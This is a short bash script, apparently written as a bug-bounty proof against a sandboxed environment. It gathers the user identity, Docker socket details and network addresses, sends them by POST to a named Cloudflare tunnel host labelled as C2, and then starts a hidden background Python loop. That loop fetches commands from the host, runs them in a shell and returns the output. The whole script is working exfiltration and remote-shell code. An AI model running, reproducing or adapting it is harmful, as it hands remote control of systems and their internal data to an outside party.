#!/bin/bash
# C2_URL: https://gain-properly-curriculum-project.trycloudflare.com

URL="https://gain-properly-curriculum-project.trycloudflare.com"

# --- THE AUTO-DASHBOARD PAYLOAD ---
{
  echo "--- [!] GOOGLE VRP: DASHBOARD BEACON ACTIVE ---"
  echo "TIMESTAMP: $(date)"
  echo "USER: $(id)"
  
  # PROOF 1: Docker Socket (The $31,337 Evidence)
  echo "--- DOCKER ENGINE STATUS ---"
  curl -s --unix-socket /var/run/docker.sock http://localhost/info | grep -E "KernelVersion|NCPU" || echo "Socket Access Denied"
  
  # PROOF 2: Network Internals
  echo "--- NETWORK MAP ---"
  ip addr show | grep "inet "
  
} > /tmp/jules_report.txt

# --- THE EXFILTRATION ---
# This sends the file to your Mac via the Cloudflare Tunnel
curl -s -X POST --data-binary @/tmp/jules_report.txt "$URL"

# --- THE PERSISTENT WEB-SHELL (FAILSAFE) ---
# This listens for commands you might send from your Mac
python3 -c "
import os, subprocess, time, urllib.request
while True:
    try:
        # Check C2 for new commands to run
        cmd = urllib.request.urlopen('$URL/cmd').read().decode()
        if cmd:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            urllib.request.urlopen(urllib.request.Request('$URL', data=output))
    except: pass
    time.sleep(10)
" &
